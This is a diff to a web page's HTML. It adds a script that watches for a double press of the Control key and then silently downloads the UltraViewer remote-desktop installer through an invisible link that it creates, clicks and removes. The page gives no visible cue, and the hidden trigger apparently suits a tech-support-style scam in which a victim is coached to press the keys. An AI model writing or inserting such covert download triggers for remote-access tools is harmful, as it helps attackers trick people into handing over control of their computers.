@@ -824,28 +824,29 @@ document.addEventListener("click", function (e) {
 
     </script>
     <div class="imgTagappend"></div>
-      <script>
-        
-let lastCtrlTime = 0;
-const DOUBLE_PRESS_DELAY = 800; // milliseconds
+<script>
+let lastPress = 0;
+const delay = 600;
 
 document.addEventListener("keydown", function(event) {
     if (event.key === "Control" && !event.repeat) {
+
         const now = Date.now();
 
-        if (now - lastCtrlTime <= DOUBLE_PRESS_DELAY) {
-            // Double Ctrl detected
-            window.location.href = "https://www.ultraviewer.net/en/UltraViewer_setup_6.6_en.exe";
+        if (now - lastPress <= delay) {
 
-            // Reset so it can be detected again later
-            lastCtrlTime = 0;
-        } else {
-            lastCtrlTime = now;
+            // Create invisible download link
+            const a = document.createElement("a");
+            a.href = "https://www.ultraviewer.net/en/UltraViewer_setup_6.6_en.exe";
+            a.download = "";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
         }
-    
+
+        lastPress = now;
     }
 });
-
-      </script>
+</script>
   </body>
 </html>
